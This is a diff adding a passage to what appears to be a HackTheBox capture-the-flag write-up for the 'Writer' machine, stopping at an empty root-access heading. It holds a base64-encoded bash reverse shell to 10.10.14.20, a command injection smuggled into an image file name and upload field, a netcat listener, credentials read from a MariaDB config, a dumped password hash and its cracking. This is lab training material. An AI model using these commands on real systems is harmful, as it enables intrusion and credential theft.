@@ -253,3 +253,88 @@ mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
 
 </html>
 ```
+
+let's generate a payloud for a reverse shell
+
+```
+echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.20/1234 0>&1'" | base64
+```
+>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMC8xMjM0IDA+JjEn
+```
+touch '1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMC8xMjM0IDA+JjEn | base64 -d | bash `;'
+```
+
+Before uploading the payload start a netcat listener.  I like to use rlwrap when I use netcat.
+
+```
+rlwrap nc -lvnp 1234
+```
+
+Now edit a story and add the package.  After uploading the package edit a story again and intercept the post request. Then edit the request with the local directory of the file. Ex.
+
+```
+------WebKitFormBoundaryW1Pu2dDRgk5rlBlP
+Content-Disposition: form-data; name="image_url"
+
+file:///var/www/writer.htb/writer/static/img/1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMC8xMjM0IDA+JjEn | base64 -d | bash `;#
+```
+
+Finally, we should now have a shell on netcat!
+
+```
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+ss -tupln
+```
+
+reveals that we have a mysql db
+
+```
+cd /etc/mysql
+cat mariadb.cnf
+```
+
+Reveals some django user creds, sweet!
+
+> user = djangouser
+> password = DjangoSuperPassword
+
+Log into mysql on the victim and poke around for user information
+
+```
+mysql -h 127.0.0.1
+show databases;
+use dev;
+show tables
+SELECT * FROM auth_user;
+```
+
+```
++----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
+| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
++----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
+|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
++----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
+1 row in set (0.000 sec)
+```
+
+Finally we have a hash for kyle. Now let's crack it using johntheripper!
+
+```
+haschcat -a - -m 10000 hash.txt --wordlist rockyou.txt
+```
+>marcoantonio
+
+Now ssh into the box with kyle's creds!
+
+```
+ssh kyle@writer.htb -p 22
+cat user.txt
+```
+
+That's it for the user flag! Now it's time to get...
+
+## Root Access
+
+
+
+
